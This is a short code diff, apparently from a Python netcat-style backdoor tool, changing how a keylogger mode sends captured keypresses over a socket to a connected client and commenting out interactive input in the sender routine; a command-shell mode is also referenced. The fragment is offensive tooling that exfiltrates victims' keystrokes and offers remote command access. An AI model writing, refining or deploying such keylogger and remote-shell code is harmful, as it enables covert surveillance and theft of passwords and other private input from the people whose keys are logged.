@@ -99,15 +99,14 @@ def client_handler(client_socket):
 
         if keylogger:
                 while True:
-                        if len(keypresses):
-                                with lock:
-                                    msg = ""
-                                    for key in keypresses:
-                                            msg += key + '\n'
+                    with lock:
+                        if len(keypresses): 
+                            msg = ""
+                            for key in keypresses:
+                                msg += key + '\n'
 
-                                    keypresses = []
-
-                                client_socket.send(msg)
+                            keypresses = []
+                            client_socket.send(msg)
 
         # now we go into another loop if a command shell was requested
         if command:
@@ -181,11 +180,8 @@ def client_sender(buffer):
                         print response,
 
                         # wait for more input
-                        buffer = raw_input("")
-                        buffer += "\n"
-
-                        # send it off
-                        client.send(buffer)
+                        # buffer = raw_input("")
+                        # buffer += "\n"
 
 
         except Exception as e:
